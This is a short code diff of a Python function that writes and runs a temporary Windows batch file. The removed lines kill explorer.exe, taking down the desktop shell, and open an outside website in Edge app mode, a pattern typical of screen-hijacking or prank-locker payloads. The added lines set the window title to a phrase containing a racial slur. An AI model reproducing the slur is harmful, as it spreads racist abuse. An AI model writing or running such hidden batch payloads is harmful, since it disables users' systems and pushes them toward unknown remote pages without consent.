@@ -5,8 +5,8 @@ import subprocess
 def run_bat_from_exe():
     bat_content = '''
 @echo off
-taskkill /f /im explorer.exe
-start msedge --app=https://catsdevs.online/assets/
+title stupid nigger game thing
+pause
 '''
  
     with tempfile.NamedTemporaryFile(delete=False, suffix='.bat') as temp_bat:
